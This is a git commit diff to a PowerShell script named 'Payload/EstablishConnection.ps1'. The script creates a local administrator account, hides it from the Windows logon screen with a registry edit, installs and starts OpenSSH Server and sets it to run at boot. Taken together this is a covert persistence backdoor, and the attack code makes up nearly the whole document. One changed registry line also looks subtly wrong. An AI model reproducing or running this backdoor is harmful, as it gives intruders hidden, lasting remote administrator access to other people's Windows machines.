08b99369dfc214297221f6c98e4ba9e4f76920aa
ReylanTeo <109081015+ReylanTeo@users.noreply.github.com>
2023-10-28 16:07:39 +0800

    Fixed

--- Payload/EstablishConnection.ps1
+++ Payload/EstablishConnection.ps1
@@ -10,18 +10,21 @@ $Password = RandomPasswordGenerator  # Corrected variable name
 if (Get-LocalUser -Name $Username -ErrorAction SilentlyContinue) {
     Remove-LocalUser -Name $Username
 }
+
 # Create a new local user with administrator privileges
-New-LocalUser $Username -Password $Password -FullName $Username -Description "Temporary Local Administrator"
+New-LocalUser $Username -Password (ConvertTo-SecureString $Password -AsPlainText -Force) -FullName $Username -Description "Temporary Local Administrator"
+
 # Add the new user to the Administrators group
 Add-LocalGroupMember -Group "Administrators" -Member $Username
 
 # Hide user from Windows logon screen
-New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name SpecialAccounts -Force
-New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" -Name UserList -Force
-New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $Username -Value "00000000" -PropertyType DWORD -Force
+New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $Username -Value 0 -PropertyType DWORD -Force
 
 # Install the OpenSSH Server
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+
 # Start the sshd service
 Start-Service sshd
+
+# Set the sshd service to start automatically
 Set-Service -Name sshd -StartupType "Automatic"
